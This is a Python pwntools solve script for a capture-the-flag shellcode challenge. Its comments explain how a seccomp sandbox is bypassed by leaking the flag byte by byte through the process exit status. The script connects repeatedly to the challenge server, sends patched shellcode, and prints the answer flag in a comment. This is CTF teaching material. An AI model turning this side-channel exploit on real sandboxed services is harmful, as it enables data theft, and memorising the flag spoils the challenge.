from pwn import *
from pathlib import Path

# The challenge is about reading the flag with only 2 syscalls
# We are limited by seccomp to open/read/write/exit syscalls only

# The solution is simply the fact that the shellcode ends with the exit
# syscall (which is not counted as one of our 2 syscalls),
# and the server leaks the exit status of the process.
# So we can leak a single character at a time by passing it as the exit status. 

# The flag is "KCTF{l34k_fl4g_w17h_0p3n_r34d_3x17(fl4g_by73)}"
flag = []
FLAG_LENGTH = 46

base_shellcode = Path("solution.shellcode").read_bytes().hex()

for flag_char_offset in range(FLAG_LENGTH):
    # Connect until the prompt to enter the shellcode
    p = remote("kitctf.me", 1338)
    p.recvuntil("> ")
    
    # Patch into the shellcode the offest of the character we now read
    patched_shellcode = base_shellcode.replace("17", "{0:0{1}x}".format(flag_char_offset, 2))
    p.sendline(patched_shellcode)

    # Get the exit status - this is the leaked character of the flag at the specific offset
    p.recvuntil("exit status ")
    status = p.recvuntil(".")[:-1]
    p.close()

    # Append to the flag and print the flag so far
    flag.append(int(status.decode()))
    print("".join(chr(i) for i in flag))
